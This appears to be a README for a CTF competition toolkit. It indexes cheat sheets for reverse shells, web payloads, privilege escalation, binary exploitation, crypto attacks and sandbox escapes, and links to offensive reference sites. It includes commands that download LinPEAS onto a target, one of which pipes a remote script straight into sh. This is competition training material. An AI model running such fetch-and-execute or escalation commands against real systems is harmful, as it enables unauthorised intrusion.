# CTF Arsenal

Reference cheat sheets, solver scripts, and payloads for the Grand Final.

## Table of Contents

### Stage 1: Boot2Root
- [07-boot2root/recon_and_shells.md](07-boot2root/recon_and_shells.md): Nmap scan profiles, reverse shell one-liners, TTY stabilization, and file transfers.
- [01-web/web_payloads.md](01-web/web_payloads.md): Web footholds (SSTI, SQLi, LFI wrappers, file upload bypass, command injection).
- [01-web/speed_tools.md](01-web/speed_tools.md): High-speed tools (ffuf, sqlmap, Python sessions) bypassing Burp Community limits.
- [07-boot2root/linux_privesc.md](07-boot2root/linux_privesc.md): Linux privilege escalation (SUID, sudo -l, cron jobs, writable /etc/passwd, LinPEAS).
- [07-boot2root/windows_privesc.md](07-boot2root/windows_privesc.md): Windows privilege escalation (SeImpersonatePrivilege, GodPotato, unquoted paths, WinPEAS).

### Stage 2: Forensics
- [05-forensics/triage_checklist.md](05-forensics/triage_checklist.md): 8-phase triage handbook for PCAP, steganography, file headers, and Volatility 3.

### Supplementary Categories
- [02-pwn/template_pwntools.py](02-pwn/template_pwntools.py): Pwntools template for local and remote buffer overflows.
- [02-pwn/pwn_cheatsheet.md](02-pwn/pwn_cheatsheet.md): GDB-pwndbg commands, cyclic offset calculation, ret2win, and ROP.
- [03-reverse/reverse_cheatsheet.md](03-reverse/reverse_cheatsheet.md): Ghidra shortcuts, ltrace, strace, UPX unpacking, and pyc decompilation.
- [04-crypto/rsa_solver.py](04-crypto/rsa_solver.py): Python script for common RSA attacks (FactorDB, small e, Fermat).
- [04-crypto/crypto_cheatsheet.md](04-crypto/crypto_cheatsheet.md): Classic ciphers, XOR scripts, hash identification, and online tools.
- [06-misc/pyjail_and_sockets.md](06-misc/pyjail_and_sockets.md): Python sandbox escape techniques and socket automation script.

---

## Essential Web References
- [dcode.fr](https://www.dcode.fr/): Cipher identification and classic cipher solver.
- [revshells.com](https://www.revshells.com/): Reverse shell generator.
- [CyberChef](https://gchq.github.io/CyberChef/): Data encoding, decoding, and analysis tool.
- [factordb.com](https://factordb.com/): Online database for integer factorization.
- [GTFOBins](https://gtfobins.github.io/): Unix binaries for security testing and privilege escalation.
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings): Collection of payloads and methodologies.

---

## Quick Tool Download Commands

Commands to download and run LinPEAS on a target Linux machine:

```bash
# Run directly in memory
curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Save to /tmp and execute
curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/lp.sh && chmod +x /tmp/lp.sh
```
